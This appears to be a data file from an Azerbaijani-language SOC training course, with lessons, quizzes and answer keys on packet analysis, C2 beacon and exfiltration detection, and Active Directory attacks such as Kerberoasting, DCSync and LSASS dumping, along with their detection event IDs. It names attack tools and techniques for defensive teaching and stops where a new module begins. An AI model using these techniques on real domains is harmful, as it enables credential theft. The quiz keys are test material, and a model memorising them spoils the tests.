/* L2 — Hissə 1: Paket analizi, Windows/AD hücum aşkarlaması, Linux/Web dərin təhlil, Malware triage */
window.SOC = window.SOC || { modules: [] };
(function () {
const R = String.raw;
SOC.modules.push(
// =====================================================================
{
id: "l2-pcap", level: "L2", title: "Paket analizi: Wireshark, tcpdump, NSM",
intro: "Trafikin içini görmək. Wireshark/tcpdump ilə hücumları paket səviyyəsində aşkarlamaq.",
lessons: [
{ title: "tcpdump ilə tutma və BPF filtrləri", html: R`
<p><b>tcpdump</b> — komanda sətri paket tutucu. Serverlərdə GUI olmadıqda əvəzsizdir.</p>
<pre>tcpdump -i eth0 -nn                       # interfeys, DNS/port həlli yox
tcpdump -i eth0 -w capture.pcap           # fayla yaz
tcpdump -r capture.pcap                    # fayldan oxu
tcpdump -i eth0 -nn host 10.0.0.5          # konkret host
tcpdump -i eth0 -nn port 443               # konkret port
tcpdump -i eth0 -nn 'tcp port 80 and host 10.0.0.5'
tcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-syn != 0'   # yalnız SYN
tcpdump -i eth0 -nn -A 'port 80'          # payload-u ASCII göstər
tcpdump -i eth0 -nn src 185.220.101.45    # mənbəyə görə</pre>
<h3>BPF (Berkeley Packet Filter) — capture filtrləri</h3>
<table><tr><th>Filtr</th><th>Məna</th></tr>
<tr><td>host X</td><td>X ilə əlaqəli</td></tr><tr><td>src/dst host X</td><td>mənbə/təyinat X</td></tr>
<tr><td>port X</td><td>port X</td></tr><tr><td>net 10.0.0.0/24</td><td>şəbəkə</td></tr>
<tr><td>tcp / udp / icmp</td><td>protokol</td></tr><tr><td>and / or / not</td><td>məntiq</td></tr></table>
<div class="tip">Tutma filtri (BPF) nəyin tutulacağını, display filtri (Wireshark) isə tutulanın nəyin göstəriləcəyini təyin edir — bunları qarışdırma.</div>`},
{ title: "Wireshark: display filtrləri və analiz", html: R`
<p><b>Wireshark</b> — qrafik paket analizatoru. Display filtrləri tcpdump-dan fərqlidir.</p>
<table><tr><th>Display filtri</th><th>Məna</th></tr>
<tr><td>ip.addr == 10.0.0.5</td><td>host</td></tr><tr><td>ip.src == X / ip.dst == X</td><td>mənbə/təyinat</td></tr>
<tr><td>tcp.port == 443</td><td>port</td></tr><tr><td>http</td><td>HTTP trafik</td></tr>
<tr><td>dns</td><td>DNS</td></tr><tr><td>tcp.flags.syn == 1 && tcp.flags.ack == 0</td><td>yalnız SYN</td></tr>
<tr><td>http.request.method == "POST"</td><td>POST sorğular</td></tr>
<tr><td>dns.qry.name contains "evil"</td><td>DNS adında axtarış</td></tr>
<tr><td>tcp.flags.reset == 1</td><td>RST paketlər</td></tr>
<tr><td>frame contains "password"</td><td>məzmunda axtarış</td></tr>
<tr><td>tls.handshake.extensions_server_name</td><td>TLS SNI</td></tr></table>
<h3>Faydalı funksiyalar</h3>
<ul><li><b>Follow → TCP/HTTP Stream:</b> bütün bağlantını bir axın kimi gör (credential, komanda görünür)</li>
<li><b>Statistics → Conversations:</b> kim kiminlə, nə qədər danışıb (top talkers)</li>
<li><b>Statistics → Protocol Hierarchy:</b> protokol paylanması</li>
<li><b>Statistics → Endpoints:</b> + GeoIP ilə xəritə</li>
<li><b>File → Export Objects → HTTP:</b> ötürülən faylları çıxar (endirilən malware!)</li>
<li>Rəng qaydaları: qırmızı/qara sətirlər anomaliya (RST, retransmission) göstərir</li></ul>
<h3>Paketdə hücum əlamətləri</h3>
<ul><li>Açıq mətn credential (FTP, Telnet, HTTP Basic, köhnə protokollar)</li>
<li>Qeyri-adi portlar, uzun müddətli ESTABLISHED bağlantılar (C2 beaconing)</li>
<li>Böyük outbound transfer (exfiltration)</li>
<li>Çoxlu SYN müxtəlif portlara (skan)</li>
<li>DNS-də uzun/təsadüfi subdomenlər (tunneling)</li>
<li>Düzənli intervallarla kiçik bağlantılar (beacon — məs. hər 60 saniyədə)</li></ul>`},
{ title: "C2 Beaconing və exfiltration aşkarlaması", html: R`
<h3>C2 Beaconing</h3>
<p>Malware müəyyən intervalla C2 serverinə "mən sağam, əmr varmı?" soruşur. Bu <b>müntəzəmlik (periodicity)</b> aşkarlamanın açarıdır.</p>
<ul><li><b>Əlamətlər:</b> eyni iki host arasında bərabər intervallı (məs. hər 300s ± jitter) kiçik bağlantılar; eyni ölçülü paketlər; uzun müddət davam edən əlaqə.</li>
<li><b>Jitter:</b> hücumçular aşkarlanmamaq üçün intervalı təsadüfiləşdirir (məs. 60s ± 20%).</li>
<li><b>Gizlənmə:</b> 443 (HTTPS), domain fronting, legitim xidmətlər (Slack, Discord, GitHub, Telegram API-ləri) üzərindən C2.</li>
<li><b>Aşkarlama:</b> bağlantı vaxtlarının fərqini (delta) hesablayıb standart sapmaya bax (RITA, Zeek + analiz, SIEM-də aggregation). JA3, qeyri-adi User-Agent, yeni/nadir domen.</li></ul>
<h3>Data Exfiltration</h3>
<ul><li>Böyük <b>outbound</b> həcm (download-dan çox upload — anomal)</li>
<li>Qeyri-iş saatlarında transfer</li><li>Tanınmayan bulud saxlama/fayl paylaşım saytlarına yükləmə</li>
<li>DNS/ICMP tunneling (kiçik hissələrlə)</li><li>Şifrəli arxivlərin göndərilməsi</li></ul>
<h3>Zeek (NSM) nümunə logları</h3>
<p>Zeek paket deyil, zəngin <b>metadata loglar</b> yaradır: <code>conn.log</code> (bütün bağlantılar + müddət + byte), <code>dns.log</code>, <code>http.log</code>, <code>ssl.log</code> (JA3, SNI, sertifikat), <code>files.log</code>, <code>notice.log</code>. Böyük həcmdə trafik analizi üçün paketdən praktikdir.</p>
<pre># conn.log-da uzun/böyük bağlantıları tapmaq (sadələşdirilmiş)
cat conn.log | zeek-cut id.orig_h id.resp_h duration orig_bytes resp_bytes \
  | sort -k4 -rn | head    # ən uzun bağlantılar = potensial C2</pre>
<div class="note">Threat hunting-də "uzun müddət + az data + müntəzəm interval + nadir təyinat" kombinasiyası klassik beacon imzasıdır. Cobalt Strike, Metasploit, Sliver kimi C2 freymvorkları bu cür davranır.</div>`},
{ title: "Praktiki pcap təhqiqatı", html: R`
<p>Real təhqiqatda pcap-a baxanda strukturlu yanaşma:</p>
<ol><li><b>Ümumi mənzərə:</b> Statistics → Conversations/Protocol Hierarchy. Kim var, hansı protokollar?</li>
<li><b>Top talkers:</b> ən çox trafik kimdə? Anomal həcm?</li>
<li><b>DNS:</b> hansı domenlər sorğulanıb? Şübhəli/yeni/təsadüfi var?</li>
<li><b>HTTP:</b> hansı URL-lər, User-Agent-lər, POST-lar? Fayl endirmələri?</li>
<li><b>TLS:</b> hansı SNI-lər, sertifikatlar, JA3-lər?</li>
<li><b>Fayl çıxarışı:</b> Export Objects — hansı fayllar ötürülüb?</li>
<li><b>Stream takibi:</b> şübhəli bağlantıları Follow Stream ilə oxu</li>
<li><b>IOC çıxar:</b> IP, domen, hash, URL — TI-də yoxla</li></ol>
<h3>Faydalı iş axınları</h3>
<ul><li>Açıq mətn parol axtarışı: <code>http.authbasic</code> və ya Follow Stream-də credential</li>
<li>Endirilən .exe: <code>http.response.line</code> + Export Objects → HTTP</li>
<li>Şübhəli DNS: <code>dns.qry.name</code> sütununa görə sırala, uzunları tap</li>
<li>Exfiltration: Conversations-da outbound bytes-a görə sırala</li></ul>
<div class="tip">Təcrübə üçün pulsuz pcap-lar: <b>malware-traffic-analysis.net</b> (real malware pcap + tapşırıqlar), Wireshark Sample Captures, CyberDefenders və Blue Team Labs Online "network forensics" tapşırıqları. Bu saytlar müsahibəyə hazırlıq üçün qızıldır.</div>`}
],
quiz: [
{ q: "tcpdump-da yalnız 443 portunu tutmaq üçün hansı filtr?", o: ["port 443", "ip.port == 443", "tcp.port 443", "filter 443"], a: 0, e: "BPF sintaksisi. ip.port Wireshark display filtridir." },
{ q: "Wireshark-da yalnız bir hostun trafikini göstərmək üçün?", o: ["ip.addr == 10.0.0.5", "host 10.0.0.5", "src 10.0.0.5", "net 10.0.0.5"], a: 0, e: "Display filtri sintaksisi BPF-dən fərqlidir." },
{ q: "Bütün TCP bağlantısını bir mətn axını kimi görmək üçün Wireshark funksiyası?", o: ["Follow TCP Stream", "Protocol Hierarchy", "IO Graph", "Expert Info"], a: 0, e: "Credential/komanda görmək üçün ideal." },
{ q: "Capture filtri ilə display filtri arasındakı fərq nədir?", o: ["Capture nəyin tutulacağını, display tutulanın göstərilməsini təyin edir", "Fərq yoxdur", "Display daha sürətlidir", "Capture yalnız Wireshark-dadır"], a: 0, e: "BPF (tutma) vs Wireshark filtri (göstərmə)." },
{ q: "Pcap-dan ötürülmüş faylları çıxarmaq üçün Wireshark-da?", o: ["File → Export Objects", "Edit → Copy", "Statistics → Endpoints", "View → Reload"], a: 0, e: "Endirilən malware-i çıxarmaq olar." },
{ q: "C2 beaconing-in əsas aşkarlama əlaməti nədir?", o: ["Müntəzəm intervallı (periodik) bağlantılar", "Böyük tək transfer", "Çoxlu DNS səhvi", "RST paketlər"], a: 0, e: "Periodicity — bərabər vaxt aralıqları." },
{ q: "Jitter nə üçün istifadə olunur (C2)?", o: ["Beacon intervalını təsadüfiləşdirib aşkarlanmamaq", "Trafiki sürətləndirmək", "Şifrələmək", "DNS həll etmək"], a: 0, e: "Müntəzəmliyi gizlətmək." },
{ q: "Data exfiltration-ın trafik əlaməti nədir?", o: ["Anormal böyük outbound (upload) həcm", "Çoxlu SYN", "Qısa bağlantılar", "ICMP echo"], a: 0, e: "Adətən download çox olur; böyük upload şübhəlidir." },
{ q: "Zeek nə yaradır?", o: ["Zəngin şəbəkə metadata logları (conn, dns, http, ssl)", "Yalnız paket tutması", "Antivirus imzaları", "Disk образı"], a: 0, e: "NSM — paketdən praktik metadata." },
{ q: "Hansı Zeek logu TLS/JA3 və SNI məlumatını verir?", o: ["ssl.log", "conn.log", "dns.log", "files.log"], a: 0, e: "TLS metadata." },
{ q: "Çoxlu SYN, müxtəlif portlara, bir mənbədən nəyə işarədir?", o: ["Port skan", "Beaconing", "Exfiltration", "Normal veb"], a: 0, e: "Skan nümunəsi." },
{ q: "Follow HTTP Stream-də 'USER admin / PASS 123456' açıq görünür. Hansı protokol problemi var?", o: ["Açıq mətn credential (şifrəsiz protokol)", "Güclü şifrələmə", "Normal HTTPS", "DNS tunneling"], a: 0, e: "FTP/Telnet/HTTP Basic kimi protokollar şifrəsizdir." },
{ q: "zeek-cut nə edir?", o: ["Zeek loglarından konkret sahələri çıxarır", "Paket tutur", "Fayl silir", "Şifrələyir"], a: 0, e: "Log sahələrini seçmək." },
{ q: "Real malware pcap təcrübəsi üçün ən yaxşı pulsuz resurs?", o: ["malware-traffic-analysis.net", "google.com", "youtube.com", "wikipedia.org"], a: 0, e: "Real pcap + tapşırıqlar." },
{ q: "tcpdump-da payload-u ASCII görmək üçün hansı flag?", o: ["-A", "-w", "-nn", "-c"], a: 0, e: "-A ASCII, -X hex+ASCII." },
{ q: "443 portunda uzun müddətli, müntəzəm, kiçik bağlantılar + nadir domen nəyə işarədir?", o: ["Gizlənmiş C2 beaconing", "Normal video axını", "Email sinxronizasiyası", "Windows Update"], a: 0, e: "Şifrəli olsa da metadata şübhəlidir." }
],
tasks: [
{ t: "Wireshark filtri yaz", d: R`<p>Pcap-da yalnız 10.0.5.33 hostundan GEDƏN (mənbə) DNS sorğularını görmək istəyirsən.</p>`, q: "Display filtrini yaz:", ans: ["ip.src == 10.0.5.33 && dns", "ip.src==10.0.5.33 && dns", "dns && ip.src == 10.0.5.33", "dns and ip.src == 10.0.5.33", "ip.src == 10.0.5.33 and dns"], hint: "ip.src və dns-i && ilə birləşdir.", sol: "<code>ip.src == 10.0.5.33 && dns</code> — bu hostun DNS sorğularını göstərir. DNS tunneling/DGA axtararkən sonra <code>dns.qry.name</code> sütununu əlavə edib uzun/təsadüfi adları axtarırsan." },
{ t: "Beacon tap", d: R`<p>conn.log çıxarışı (host 10.0.5.33 → 193.42.33.17:443), bağlantı başlama vaxtları:</p><pre>10:00:03
10:05:04
10:10:02
10:15:05
10:20:03
10:25:04
... (24 saat boyu davam edir, hər dəfə ~90 byte) ...</pre>`, q: "Bu bağlantıların interval nümunəsi (saniyə) təxminən nədir?", ans: ["300", "300s", "5 dəqiqə", "5 minutes", "300 saniyə"], hint: "10:00:03 → 10:05:04 ≈ ?", sol: "~300 saniyə (5 dəqiqə) ± kiçik jitter. Müntəzəm interval + kiçik sabit ölçü (~90 byte) + uzun müddət (24 saat) + nadir xarici IP = klassik C2 beacon. Addım: 193.42.33.17-ni TI-də yoxla, host-u izolyasiya et, malware tap, L3/hunt-a ötür. 90 byte çox kiçikdir — real data deyil, 'check-in'dir." },
{ t: "Exfiltration təhlili", d: R`<p>Statistics → Conversations (24 saatlıq pcap):</p><pre>10.0.8.20 ↔ 203.0.113.99   orig_bytes: 4.2 GB   resp_bytes: 15 KB   port 443
10.0.8.20 ↔ update.windows.com  orig: 50 KB  resp: 200 MB  port 443
10.0.8.21 ↔ cdn.site.com  orig: 30 KB  resp: 1.5 GB  port 443</pre>`, q: "Hansı bağlantı data exfiltration-a ən çox bənzəyir? (IP)", ans: ["203.0.113.99", "10.0.8.20"], hint: "Çox GÖNDƏRİLƏN (orig_bytes), az gələn.", sol: "10.0.8.20 → 203.0.113.99: 4.2 GB GÖNDƏRİLİB (orig_bytes), cəmi 15 KB gəlib. Bu tərs nisbət (böyük upload, kiçik download) klassik exfiltration əlamətidir. Digər ikisi normal download nümunəsidir (Windows Update, CDN — çox gələn, az gedən). Addım: 203.0.113.99-u araşdır, 10.0.8.20-də nə baş verdiyini tap, DLP/containment." },
{ t: "Pcap təhlili praktikası (lab)", d: R`<p>Real paket analizi bacarığı qazan.</p>`, steps: ["Wireshark quraşdır", "malware-traffic-analysis.net-dən bir 'traffic analysis exercise' seç (pcap + suallar)", "Protocol Hierarchy və Conversations ilə ümumi mənzərəyə bax", "DNS və HTTP sorğularını təhlil et, şübhəli domenləri tap", "Export Objects ilə endirilən faylı çıxar, hash-ini al, VT-də yoxla (faylın özünü yox!)", "Tapıntıları IOC siyahısı kimi SOC notebook-una yaz"], sol: "malware-traffic-analysis.net tapşırıqları real SOC/forensik işi simulyasiya edir və cavab açarları var. Bu saytı tamamlamaq müsahibədə çox dəyərlidir." }
]
},
// =====================================================================
{
id: "l2-ad", level: "L2", title: "Active Directory hücumları və aşkarlanması",
intro: "Korporativ şəbəkələrin ürəyi AD-dir. Kerberos hücumları, credential access, lateral movement və aşkarlama.",
lessons: [
{ title: "AD recon və credential access", html: R`
<h3>Enumeration (kəşfiyyat) — T1087, T1069, T1482</h3>
<p>Hücumçu AD-yə düşən kimi mühiti xəritələyir: istifadəçilər, qruplar, kompüterlər, etibarlar, ACL-lər. Alətlər: <b>BloodHound/SharpHound</b> (hücum yollarını qrafik göstərir), <code>net</code> əmrləri, <code>PowerView</code>, LDAP sorğuları, <code>nltest</code>, <code>setspn</code>.</p>
<p><b>Aşkarlama:</b> qısa müddətdə kütləvi LDAP sorğuları (Event 1644 və ya şəbəkə), anormal SAMR/LSARPC trafiki, bir host-dan çox sayda hesaba sorğu. Honeypot hesab/obyektlər (canary) toxunulanda alert.</p>
<h3>Credential Access — T1003</h3>
<table><tr><th>Texnika</th><th>Təsvir</th><th>Aşkarlama</th></tr>
<tr><td>LSASS dump (T1003.001)</td><td>lsass.exe yaddaşından parollar/hashlər (Mimikatz, comsvcs.dll, Task Manager dump)</td><td>Sysmon 10: lsass-a GrantedAccess 0x1010/0x1410; qeyri-adi proses lsass-a girir</td></tr>
<tr><td>SAM/SYSTEM (T1003.002)</td><td>Reg save ilə SAM hive</td><td>reg save HKLM\SAM; VSS copy</td></tr>
<tr><td>NTDS.dit (T1003.003)</td><td>DC-dən bütün domen hashləri</td><td>ntdsutil, vssadmin, DC-də qeyri-adi fayl girişi</td></tr>
<tr><td>DCSync (T1003.006)</td><td>DC kimi davranıb replikasiya ilə hash istə</td><td>Event 4662 (Replicating Directory Changes) qeyri-DC hesabdan!</td></tr>
<tr><td>Credential in files/GPP</td><td>Skript, GPP cpassword, memory</td><td>Fayl girişi</td></tr></table>
<div class="warn">Mimikatz və LSASS dump SOC-un ən kritik alertlərindəndir. lsass.exe-yə qeyri-adi proses girişi (Sysmon Event 10) dərhal araşdırılmalıdır.</div>`},
{ title: "Kerberos hücumları", html: R`
<p>Kerberos AD autentifikasiya protokoludur. Əsas hücumlar:</p>
<h3>Kerberoasting (T1558.003)</h3>
<p>Hücumçu SPN-i olan servis hesablarının service ticket-ini (TGS) istəyir, bu bilet servis hesabının parol hash-i ilə şifrələnib. Offline qırıb parolu tapır (servis hesabları çox vaxt zəif parollu).</p>
<ul><li><b>Əlamət:</b> bir hesabdan qısa müddətdə çoxlu <b>Event 4769</b> (TGS request), xüsusən zəif şifrələmə (RC4/0x17) tələbi. <code>setspn -q</code>, GetUserSPNs istifadəsi.</li></ul>
<h3>AS-REP Roasting (T1558.004)</h3>
<p>"Kerberos pre-authentication" söndürülmüş hesablar üçün AS-REP istənir və offline qırılır.</p>
<ul><li><b>Əlamət:</b> Event 4768 pre-auth olmayan hesablar üçün, RC4.</li></ul>
<h3>Pass-the-Hash (T1550.002) və Pass-the-Ticket (T1550.003)</h3>
<p>Parol əvəzinə NTLM hash (PtH) və ya Kerberos bilet (PtT) ilə autentifikasiya. Oğurlanmış credential-la lateral movement.</p>
<ul><li><b>Əlamət:</b> qeyri-adi NTLM istifadəsi (4776), bir hostdan çox hostʼa eyni hesabla şəbəkə logon (4624 Type 3), eyni biletin fərqli maşınlarda istifadəsi.</li></ul>
<h3>Golden/Silver Ticket (T1558.001/002)</h3>
<ul><li><b>Golden Ticket:</b> krbtgt hash-i ilə saxta TGT yaratmaq → istənilən istifadəçi/hüquq, uzunömürlü. DC tam kompromisi deməkdir.</li>
<li><b>Silver Ticket:</b> servis hesabı hash-i ilə saxta TGS → konkret xidmətə giriş.</li>
<li><b>Əlamət:</b> anormal bilet ömrü, mövcud olmayan hesab üçün bilet, 4769 anomaliyaları, krbtgt istifadəsi. (Aşkarlama çətindir — krbtgt parolunu mütəmadi dəyişmək vacibdir.)</li></ul>
<div class="note">Vacib Event ID-lər: <b>4768</b> TGT istəndi, <b>4769</b> TGS istəndi (Kerberoasting!), <b>4770</b> TGS yeniləndi, <b>4771</b> pre-auth uğursuz, <b>4776</b> NTLM. Encryption type 0x17 = RC4 (zəif, hücum əlaməti), 0x12 = AES256 (normal).</div>`},
{ title: "Lateral Movement və Persistence (AD)", html: R`
<h3>Lateral Movement texnikaları — TA0008</h3>
<table><tr><th>Texnika</th><th>Port/əlamət</th><th>Aşkarlama</th></tr>
<tr><td>RDP (T1021.001)</td><td>3389</td><td>4624 Type 10; qeyri-adi mənbə/vaxt</td></tr>
<tr><td>SMB/Admin shares + PsExec (T1021.002, T1569.002)</td><td>445; ADMIN$, C$</td><td>7045 servis quraşdırma; PSEXESVC; 4624 Type 3; 5140 share access</td></tr>
<tr><td>WMI (T1047)</td><td>135 + dinamik</td><td>WmiPrvSE.exe child proses; qeyri-adi uzaq WMI</td></tr>
<tr><td>WinRM/PowerShell Remoting (T1021.006)</td><td>5985/5986</td><td>wsmprovhost.exe; 4624; PowerShell logları</td></tr>
<tr><td>Scheduled Task uzaqdan (T1053.005)</td><td>—</td><td>4698 başqa hostdan</td></tr>
<tr><td>Pass-the-Hash</td><td>—</td><td>NTLM anomaliyası</td></tr></table>
<h3>Persistence (AD mühitində) — TA0003</h3>
<ul><li>Yeni hesab yaratmaq (4720) və ya mövcud hesaba imtiyaz vermək (4728/4732/4756 — admin qrupuna əlavə)</li>
<li>GPO manipulyasiyası (hamıya təsir edir)</li><li>AdminSDHolder, DCShadow (qabaqcıl)</li>
<li>Service/Scheduled task (7045, 4698)</li><li>Skeleton Key, DSRM</li>
<li>SIDHistory injection</li></ul>
<h3>Privilege Escalation (AD)</h3>
<ul><li>Kerberoasting → servis hesabı parolu → daha çox hüquq</li><li>ACL sui-istifadəsi (BloodHound yolları: GenericAll, WriteDacl)</li>
<li>Unconstrained/Constrained delegation sui-istifadəsi</li><li>Zerologon (CVE-2020-1472), PrintNightmare, noPac kimi CVE-lər</li></ul>
<div class="tip">AD təhqiqatında <b>timeline</b> qurmaq əsasdır: ilkin giriş (phishing/exploit) → kəşfiyyat (BloodHound) → credential access (LSASS/Kerberoast) → lateral movement (PtH/PsExec) → privilege escalation → domain dominance (DCSync/Golden Ticket) → impact. Hər mərhələdə hansı Event ID-lərin yarandığını bil.</div>`},
{ title: "AD müdafiəsi və monitorinq", html: R`
<h3>Monitorinq prioritetləri</h3>
<ul><li>Həssas qrup üzvlük dəyişiklikləri (Domain/Enterprise Admins) — 4728/4732/4756</li>
<li>4769 Kerberoasting nümunələri (bir hesab, çox SPN, RC4)</li>
<li>Sysmon 10: lsass.exe-yə giriş</li>
<li>4662: DCSync əlaməti (Replicating Directory Changes, qeyri-DC hesab)</li>
<li>Yeni servis (7045) / scheduled task (4698) kritik serverlərdə</li>
<li>Anormal logon nümunələri (impossible travel, qeyri-iş saatı, service hesabı interactive logon)</li>
<li>1102: log silinməsi; EDR tamper</li>
<li>Honeypot/canary hesablarına toxunuş</li></ul>
<h3>Hardening</h3>
<ul><li><b>Tiered admin model</b> (Tier 0/1/2) — DC-lərə yalnız Tier 0 hesablar giriş</li>
<li><b>LAPS</b> — lokal admin parollarını unikallaşdırır (lateral movement-i çətinləşdirir)</li>
<li>Güclü servis hesabı parolları + gMSA; krbtgt parolunu mütəmadi iki dəfə rotasiya</li>
<li>NTLM-i mümkün qədər söndür; SMB signing; LDAP signing</li>
<li>Protected Users qrupu, Credential Guard</li><li>Minimum delegation; lazımsız SPN-ləri sil</li>
<li>Patch (Zerologon, PrintNightmare və s.)</li><li>Attack Surface Reduction qaydaları</li></ul>
<h3>Faydalı alətlər</h3>
<p><b>BloodHound</b> (müdafiəçi də hücum yollarını görmək üçün istifadə edir), <b>PingCastle/Purple Knight</b> (AD təhlükəsizlik auditi), <b>Microsoft Defender for Identity</b> (ATA varisi — AD hücumlarını aşkarlayır).</p>
<div class="warn">Bu modulun hücum texnikalarını yalnız öz lab AD mühitində (növbəti bölmədəki homelab) öyrən. Real domendə icazəsiz sınaq ciddi cinayətdir.</div>`}
],
quiz: [
{ q: "Kerberoasting hansı Event ID-də görünür?", o: ["4769 (TGS request)", "4625", "4688", "1102"], a: 0, e: "Servis biletləri istənir, offline qırılır." },
{ q: "LSASS yaddaşından credential oğurluğu hansı Sysmon Event ID ilə izlənir?", o: ["10 (ProcessAccess)", "1", "3", "22"], a: 0, e: "lsass.exe-yə qeyri-adi giriş." },
{ q: "DCSync hücumu hansı Event ID anomaliyası ilə aşkarlanır?", o: ["4662 (Replicating Directory Changes qeyri-DC hesabdan)", "4624", "7045", "4720"], a: 0, e: "Hücumçu DC kimi replikasiya istəyir." },
{ q: "Golden Ticket hansı hesabın hash-i ilə yaradılır?", o: ["krbtgt", "Administrator", "Guest", "SYSTEM"], a: 0, e: "krbtgt saxta TGT imzalamağa imkan verir." },
{ q: "Pass-the-Hash nədir?", o: ["Parol əvəzinə NTLM hash ilə autentifikasiya", "Parol qırmaq", "Hash hesablamaq", "Bilet yeniləmək"], a: 0, e: "Oğurlanmış hash ilə lateral movement." },
{ q: "BloodHound/SharpHound nə üçündür?", o: ["AD hücum yollarını qrafik şəkildə xəritələmək", "Parol qırmaq", "Firewall qurmaq", "Email göndərmək"], a: 0, e: "Həm hücumçu, həm müdafiəçi istifadə edir." },
{ q: "Kerberos encryption type 0x17 nəyi göstərir?", o: ["RC4 (zəif, hücum əlaməti ola bilər)", "AES256 (güclü)", "Şifrəsiz", "SHA256"], a: 0, e: "RC4 downgrade Kerberoasting əlamətidir." },
{ q: "PsExec ilə lateral movement hansı izləri qoyur?", o: ["7045 servis quraşdırma + 4624 Type 3", "4769", "1102", "4662"], a: 0, e: "PSEXESVC servisi + şəbəkə logon." },
{ q: "AS-REP Roasting hansı hesabları hədəf alır?", o: ["Kerberos pre-auth söndürülmüş hesablar", "Bütün hesablar", "Yalnız Administrator", "Guest"], a: 0, e: "Pre-auth olmayan hesablar." },
{ q: "WinRM/PowerShell Remoting hansı portdadır?", o: ["5985/5986", "3389", "445", "88"], a: 0, e: "wsmprovhost.exe yaradır." },
{ q: "NTDS.dit nəyi ehtiva edir?", o: ["Bütün domen hesablarının hashləri", "Lokal parollar", "Firewall qaydaları", "DNS qeydləri"], a: 0, e: "DC-dəki AD bazası — tam domen kompromisi." },
{ q: "İstifadəçinin Domain Admins qrupuna əlavəsi hansı Event ID?", o: ["4728", "4624", "4769", "7045"], a: 0, e: "Qlobal təhlükəsizlik qrupuna üzv əlavəsi." },
{ q: "LAPS nəyə kömək edir?", o: ["Lokal admin parollarını unikallaşdırıb lateral movement-i çətinləşdirir", "Kerberos-u söndürür", "Logları silir", "DNS-i qoruyur"], a: 0, e: "Local Administrator Password Solution." },
{ q: "Tiered admin model nə üçündür?", o: ["Yüksək imtiyazlı hesabların istifadəsini izolyasiya etmək", "Daha çox admin yaratmaq", "Parolları silmək", "Sürəti artırmaq"], a: 0, e: "DC-lərə yalnız Tier 0 giriş." },
{ q: "Silver Ticket Golden-dən nə ilə fərqlənir?", o: ["Servis hesabı hash-i ilə konkret xidmətə saxta TGS", "DC-ni silir", "Bütün domeni ələ keçirir", "Parol dəyişir"], a: 0, e: "Golden = krbtgt/TGT (geniş); Silver = servis/TGS (dar)." },
{ q: "krbtgt parolunu niyə mütəmadi (iki dəfə) dəyişmək lazımdır?", o: ["Golden Ticket imkanını aradan qaldırmaq", "Sürət üçün", "Disk yeri üçün", "Lisenziya üçün"], a: 0, e: "Oğurlanmış krbtgt hash-i etibarsızlaşır." },
{ q: "Event 4624 Type 3 bir servis hesabı üçün çox hostdan görünür. Nəyə işarə edə bilər?", o: ["Pass-the-Hash / lateral movement", "Normal login", "Parol dəyişikliyi", "Printer işi"], a: 0, e: "Oğurlanmış credential ilə yayılma." }
],
tasks: [
{ t: "Kerberoasting aşkarla", d: R`<pre>Event 4769  Account: j.user  Service: MSSQLSvc/db01.corp.local  Ticket Encryption: 0x17
Event 4769  Account: j.user  Service: HTTP/web01.corp.local     Ticket Encryption: 0x17
Event 4769  Account: j.user  Service: CIFS/file01.corp.local    Ticket Encryption: 0x17
Event 4769  Account: j.user  Service: MSSQLSvc/db02.corp.local  Ticket Encryption: 0x17
... (j.user 2 dəqiqədə 40 fərqli SPN üçün 4769, hamısı 0x17) ...</pre>`, q: "Bu hansı hücumdur? (bir söz)", ans: ["kerberoasting", "kerberoast"], hint: "Çox SPN üçün TGS + RC4 (0x17).", sol: "Kerberoasting (T1558.003). Bir hesab (j.user) qısa müddətdə çox sayda servis SPN-i üçün TGS istəyib, hamısı RC4 (0x17 — zəif, offline qırmaq üçün). Normal istifadəçi belə davranmaz. Addım: j.user hesabını araşdır (kompromis olunub?), təsirlənən servis hesablarının parollarını güclü/uzun et (gMSA), AES-ə keç, L3/hunt-a ötür. GetUserSPNs/Rubeus istifadəsi ehtimalı." },
{ t: "DCSync tap", d: R`<pre>Event 4662
Account: WKS-FIN-08$  (bu bir iş stansiyası kompüter hesabıdır, DC DEYİL)
Object: DomainDNS
Properties: Replicating Directory Changes, Replicating Directory Changes All
Access Mask: Control Access</pre>`, q: "Bu hadisə hansı hücuma işarədir? (bir söz)", ans: ["dcsync", "dc sync"], hint: "Qeyri-DC hesab replikasiya istəyir.", sol: "DCSync (T1003.006). Normalda yalnız Domain Controller-lər 'Replicating Directory Changes' hüququndan istifadə edir. Bir iş stansiyası (WKS-FIN-08$) bunu etməsi = hücumçu domen hashlərini (krbtgt daxil) çıxarır. Bu kritikdir — domen tam kompromis yolundadır. Addım: dərhal kritik eskalasiya, həmin hesab/host-u izolyasiya et, krbtgt-i iki dəfə rotasiya et, IR başlat." },
{ t: "Lateral movement timeline", d: R`<p>Hadisələr:</p><pre>09:15  WKS-01: 4624 Type 2  user=admin (phishing sonrası)
09:22  WKS-01: Sysmon 10 lsass.exe access (Mimikatz?)
09:40  SRV-DB: 4624 Type 3  user=admin  src=WKS-01
09:41  SRV-DB: 7045 service "xcmd" installed
09:55  DC01:  4769 çoxlu SPN (Kerberoast)
10:30  DC01:  4662 DCSync from SRV-DB$</pre>`, q: "Credential access ilk olaraq hansı host-da baş verdi? (host adı)", ans: ["wks-01", "wks01", "wks-1"], hint: "LSASS access olan host.", sol: "WKS-01 — Sysmon 10 lsass.exe access (credential dump, 09:22). Tam zəncir: phishing login (WKS-01) → LSASS dump → oğurlanmış admin credential ilə SRV-DB-yə lateral (PsExec/7045) → DC-də Kerberoast → DCSync (domen hashləri). Bu, tipik ransomware/APT kill chain-idir. Hər addım ayrı Event ID buraxır — korrelyasiya bütün hekayəni açır." },
{ t: "AD lab qur (praktika)", d: R`<p>AD hücum/müdafiəsini təhlükəsiz öyrənmək üçün.</p>`, steps: ["VirtualBox-da Windows Server (DC) + 1-2 Windows client ilə kiçik domen qur (və ya 'GOAD - Game of Active Directory' avtomatlaşdırılmış lab istifadə et)", "DC-də audit siyasətini aktiv et (Kerberos, logon, object access)", "Sysmon + SwiftOnSecurity konfigi quraşdır", "Lab-da BloodHound/SharpHound işlət və hücum yollarına bax", "Kerberoasting simulyasiya et (Rubeus/Impacket GetUserSPNs) və 4769 loglarını tap", "TryHackMe 'Attacking/Defending Active Directory' və 'Investigating Windows' otaqlarını et"], sol: "GOAD (Game of Active Directory) müdafiəçilər üçün ən yaxşı pulsuz AD laboratoriyasıdır. Hücumu edib sonra loglarda izlərini tapmaq (purple team yanaşması) detection bacarığını kəskin artırır. Yalnız öz lab mühitində!" }
]
},
// =====================================================================
{
id: "l2-linuxweb", level: "L2", title: "Linux və veb server hücumlarının dərin təhlili",
